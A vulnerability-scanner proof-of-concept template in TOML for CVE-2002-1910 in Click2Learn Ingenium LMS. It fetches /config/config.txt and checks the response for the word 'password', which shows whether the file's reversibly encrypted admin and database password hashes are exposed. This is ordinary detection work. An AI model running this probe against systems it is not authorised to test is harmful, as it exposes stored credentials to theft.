[info]
author = "ave"
description = "验证 Click2Learn Ingenium Learning Management System 5.1/6.1 的 /config/config.txt 是否可被直接访问以获取可逆加密的密码哈希，该文件因位于 Web 可访问目录而暴露管理员与 DSN 密码"
id = "POC-AVE-2002-0725"
name = "CVE-2002-1910 Ingenium LMS Reversible Password Hash PoC"
severity = "high"
tags = ["ave-2002-0725"]
vuln_id = [
    "CVE-2002-1910",
    "AVE-2002-0725",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/config/config.txt"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["password"]
